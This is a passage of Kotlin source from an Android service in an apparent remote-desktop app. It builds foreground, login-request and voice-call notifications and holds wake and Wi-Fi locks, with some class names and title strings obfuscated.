            .setOnlyAlertOnce(true)
            .setContentIntent(pendingIntent)
            .setColor(Color.rgb(0, 113, 255))
            .setVisibility(NotificationCompat.VISIBILITY_PRIVATE)
            .setWhen(0)
            .setShowWhen(false)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && mediaProjection != null) {
            try {
                startForeground(DEFAULT_NOTIFY_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
            } catch (e: Exception) {
                Log.e("MainService", "createForegroundNotification: mediaProjection startForeground failed", e)
                try {
                    startForeground(DEFAULT_NOTIFY_ID, notification)
                } catch (fallback: Exception) {
                    Log.e("MainService", "createForegroundNotification: fallback startForeground failed", fallback)
                }
            }
        } else {
            try {
                startForeground(DEFAULT_NOTIFY_ID, notification)
            } catch (e: Exception) {
                Log.e("MainService", "createForegroundNotification: startForeground failed", e)
            }
        }

        try {
            if (!cpuWakeLock.isHeld) {
                cpuWakeLock.acquire()
            }
        } catch (e: Exception) {
            Log.e("MainService", "cpuWakeLock acquire failed", e)
        }
        try {
            if (!wifiLock.isHeld) {
                wifiLock.acquire()
            }
        } catch (e: Exception) {
            Log.e("MainService", "wifiLock acquire failed", e)
        }
    }

    private fun buildVoiceCallActivityIntent(clientID: Int): Intent {
        return Intent(this, oFtTiPzsqzBHGigp::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
            action = Intent.ACTION_MAIN
            addCategory(Intent.CATEGORY_LAUNCHER)
            putExtra("cloudsend_voice_call", true)
            putExtra("cloudsend_voice_call_client_id", clientID)
        }
    }

    private fun voiceCallPendingIntent(clientID: Int): PendingIntent {
        val intent = buildVoiceCallActivityIntent(clientID)
        val requestCode = VOICE_CALL_NOTIFY_REQUEST_CODE + clientID.coerceAtLeast(0)
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getActivity(this, requestCode, intent, FLAG_UPDATE_CURRENT or FLAG_IMMUTABLE)
        } else {
            PendingIntent.getActivity(this, requestCode, intent, FLAG_UPDATE_CURRENT)
        }
    }

    private fun ensureVoiceCallNotificationChannel(): String {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return DEFAULT_NOTIFY_CHANNEL
        }
        val channel = NotificationChannel(
            VOICE_CALL_NOTIFY_CHANNEL,
            "\u8bed\u97f3\u901a\u8bdd",
            NotificationManager.IMPORTANCE_HIGH
        ).apply {
            description = "\u8bed\u97f3\u901a\u8bdd\u6765\u7535\u63d0\u9192"
            lockscreenVisibility = Notification.VISIBILITY_PUBLIC
            enableLights(true)
            enableVibration(false)
            setSound(null, null)
        }
        notificationManager.createNotificationChannel(channel)
        return VOICE_CALL_NOTIFY_CHANNEL
    }

    private fun bringAppToForegroundForVoiceCall(clientID: Int, username: String, peerId: String) {
        try {
            startActivity(buildVoiceCallActivityIntent(clientID))
        } catch (e: Exception) {
            Log.e("MainService", "bring voice call activity to foreground failed", e)
        }
        voiceCallRequestNotification(clientID, "\u8bed\u97f3\u901a\u8bdd", username, peerId)
    }

    private fun loginRequestNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle(translate(p50.a(byteArrayOf(99, 114, -126, -108, -103, 110, 53, -128, 40, 85, 66, 109, -42, -46), byteArrayOf(39, 29, -94, -19, -10, 27, 21, -31, 75, 54))))
            .setContentText("$type:$username-$peerId")
            // .setStyle(MediaStyle().setShowActionsInCompactView(0, 1))
            // .addAction(R.drawable.check_blue, "check", genLoginRequestPendingIntent(true))
            // .addAction(R.drawable.close_red, "close", genLoginRequestPendingIntent(false))
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun onClientAuthorizedNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        cancelNotification(clientID)
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle("$type ${translate(p50.a(byteArrayOf(-116, -45, -93, 87, 89, -119, 82, -70, -56, -78, 82), byteArrayOf(-55, -96, -41, 54, 59, -27, 59)))}")
            .setContentText("$username - $peerId")
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun voiceCallRequestNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        val pendingIntent = voiceCallPendingIntent(clientID)
        val notification = NotificationCompat.Builder(this, ensureVoiceCallNotificationChannel())
            .setOngoing(false)
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setAutoCancel(true)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setCategory(NotificationCompat.CATEGORY_CALL)
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
            .setContentTitle(type)
            .setContentText("$username - $peerId")
            .setContentIntent(pendingIntent)
            .setFullScreenIntent(pendingIntent, true)
            .setOnlyAlertOnce(true)
            .build()
        try {
            if (Build.VERSION.SDK_INT < 33 ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
            ) {
                notificationManager.notify(getClientNotifyID(clientID), notification)
            }
        } catch (e: Exception) {
            Log.e("MainService", "voiceCallRequestNotification failed", e)
        }
    }

    private fun getClientNotifyID(clientID: Int): Int {
        return clientID + NOTIFY_ID_OFFSET
    }

    fun cancelNotification(clientID: Int) {
        notificationManager.cancel(getClientNotifyID(clientID))
    }


    private fun genLoginRequestPendingIntent(res: Boolean): PendingIntent {
        val intent = Intent(this, DFm8Y8iMScvB2YDw::class.java).apply {
            action = ACT_LOGIN_REQ_NOTIFY
            putExtra(EXT_LOGIN_REQ_NOTIFY, res)
        }
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getService(this, 111, intent, FLAG_IMMUTABLE)
        } else {
            PendingIntent.getService(this, 111, intent, FLAG_UPDATE_CURRENT)
        }
    }

    private fun setTextNotification(_title: String?, _text: String?) {
        val title = _title ?: DEFAULT_NOTIFY_TITLE
        val text = _text ?: translate(DEFAULT_NOTIFY_TEXT)
        val notification = notificationBuilder
            .clearActions()
            .setStyle(null)
            .setContentTitle(title)
            .setContentText(text)
            .build()
        notificationManager.notify(DEFAULT_NOTIFY_ID, notification)
    }
}
